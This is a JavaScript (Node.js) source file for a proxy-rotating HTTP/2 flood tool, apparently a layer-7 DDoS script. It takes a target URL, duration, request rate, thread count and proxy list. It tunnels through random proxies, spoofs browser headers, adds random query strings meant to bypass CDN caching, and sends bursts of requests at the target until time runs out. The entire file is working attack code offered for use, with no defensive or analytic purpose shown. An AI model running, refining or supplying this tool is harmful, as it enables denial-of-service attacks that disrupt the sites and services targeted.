const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
 });

if (process.argv.length < 7){console.log(`writen by @assembly3: node tls-c.js target time rate thread proxyfile`); process.exit();}
const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
} 

// ДОБАВЛЕНО: Функция для генерации случайной строки для GET-параметров
function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
   for (let counter = 1; counter <= args.threads; counter++) {
       cluster.fork();
   }
} else {setInterval(runFlooder) }

class NetSocket {
    constructor(){}

HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port
    });

    // ИСПРАВЛЕНО: Тайм-аут прокси установлен на 1000 мс (1 секунда)
    connection.setTimeout(options.timeout * 10);
    connection.setKeepAlive(true, 60000);

    connection.on("connect", () => {
        connection.write(buffer);
    });

    connection.on("data", chunk => {
        const response = chunk.toString("utf-8");
        const isAlive = response.includes("HTTP/1.1 200");
        if (isAlive === false) {
            connection.destroy();
            return callback(undefined, "error: invalid response from proxy server");
        }
        return callback(connection, undefined);
    });

    connection.on("timeout", () => {
        connection.destroy();
        return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error", error => {
        connection.destroy();
        return callback(undefined, "error: " + error);
    });
}
}

const fetch_site = [
  "same-origin",
  "same-site",
  "cross-site"
];

const fetch_mode = [
  "navigate",
  "same-origin",
  "no-cors",
  "cors"
];

const fetch_dest = [
  "document",
  "sharedworker",
  "worker"
];

const languages = [
  "en-US,en;q=0.9",
  "en-GB,en;q=0.8",
  "es-ES,es;q=0.9",
  "fr-FR,fr;q=0.9,en;q=0.8",
  "de-DE,de;q=0.9,en;q=0.8",
  "zh-CN,zh;q=0.9,en;q=0.8",
  "ja-JP,ja;q=0.9,en;q=0.8"
];
   
const useragents = [
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
 "Mozilla/5.0 (Windows NT 10.0; rv:135.0) Gecko/20100101 Firefox/135.0",
 "Mozilla/5.0 (Windows NT 10.0; rv:134.0) Gecko/20100101 Firefox/134.0",
 "Mozilla/5.0 (Windows NT 10.0; rv:133.0) Gecko/20100101 Firefox/133.0",
 "Mozilla/5.0 (Windows NT 10.0; rv:132.0) Gecko/20100101 Firefox/132.0"
];

const Header = new NetSocket();

// Устанавливаем статические заголовки один раз
headers[":method"] = "GET";
headers[":scheme"] = "https";
headers[":authority"] = parsedTarget.host;
headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8";
headers["accept-encoding"] = "gzip, deflate, br, zstd";
headers["upgrade-insecure-requests"] = "1";
headers["te"] = "trailers";

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const randomUA = useragents[Math.floor(Math.random() * useragents.length)];
    
    // ДОБАВЛЕНО: Рандомизация GET-параметра для обхода кэша CDN
    const rand_query = "?" + randomString(12) + "=" + randomIntn(100000, 999999);
    const rand_path = (parsedTarget.path || "/") + rand_query;

    headers[":authority"] = parsedTarget.host;
    headers["user-agent"] = randomUA;
    headers[":path"] = rand_path; // Установка рандомизированного пути
    headers["accept-language"] = languages[Math.floor(Math.random() * languages.length)];
    headers["sec-fetch-site"] = fetch_site[Math.floor(Math.random() * fetch_site.length)];
    headers["sec-fetch-dest"] = fetch_dest[Math.floor(Math.random() * fetch_dest.length)];
    headers["sec-fetch-mode"] = fetch_mode[Math.floor(Math.random() * fetch_mode.length)];

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100 // Используется для расчета 100 * 10 = 1000 мс
    };

    Header.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 60000);

        // ИСПРАВЛЕНО: Убрано прямое создание tlsConn и перенесено в createConnection
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
               headerTableSize: 65536,
               maxConcurrentStreams: 1000,
               initialWindowSize: 6291456,
               maxHeaderListSize: 262144,
               enablePush: false
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tls.connect({ // Библиотека http2 сама управляет TLS-соединением
                ALPNProtocols: ['h2', 'http/1.1'],
                rejectUnauthorized: false,
                socket: connection, // Используем прокси-сокет
                servername: parsedTarget.host,
            }),
            socket: connection, 
        });

        client.settings({
           headerTableSize: 65536,
           maxConcurrentStreams: 1000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           enablePush: false
         });

        client.on("connect", () => {
           const IntervalAttack = setInterval(() => {
               for (let i = 0; i < args.Rate; i++) {
                   const request = client.request(headers)
                   
                   .on("response", response => {
                       request.close();
                       request.destroy();
                       return;
                   });

                   request.end();
               }
           }, 1000); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
    });
}

const KillScript = () => process.exit(1);

setTimeout(KillScript, args.time * 1000);
}